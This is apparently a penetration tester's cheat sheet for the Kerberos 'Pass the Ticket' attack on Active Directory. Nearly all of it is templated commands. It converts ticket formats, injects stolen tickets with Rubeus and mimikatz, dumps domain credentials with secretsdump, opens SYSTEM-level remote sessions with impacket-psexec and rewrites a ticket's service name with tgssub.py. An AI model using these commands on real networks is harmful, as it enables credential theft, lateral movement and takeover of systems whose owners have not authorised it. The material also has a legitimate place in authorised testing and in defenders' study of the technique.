# Pass the Ticket (ccache / kirbi)

## Tools: mimikatz , rubeus , impacket , ticketConverter.py , secretsdump , tgssub.py

# Convert format (Use this depending on use case)

 - ticketConverter.py KIRBI||CCACHE CCACHE||KIRBI (Convert tickets to the appropriate format)

#### 1) Rubeus

 - Rubeus.exe ptt /ticket:TICKET

#### 2) Mimikatz

 - mimikatz kerberos::ptc "TICKET"

#### 3) secretsdump

 - [proxychains] secretsdump.py -k 'DOMAIN'/'USER'@'IP' (See DC Sync)

#### 4) impacket tools (Grant System/Admin access)

 - export KRB5CCNAME=/path/to/TICKET.CCACHE

 - impacket-psexec -k -no-pass USER@IP (Example)

#### 5) tgssub.py 

### Modify SPN

 - tgssub.py -in TICKET.CCACHE -out NEW_TICKET.CCACHE -altservice "SERVICE/TARGET" (Pass the Ticket)
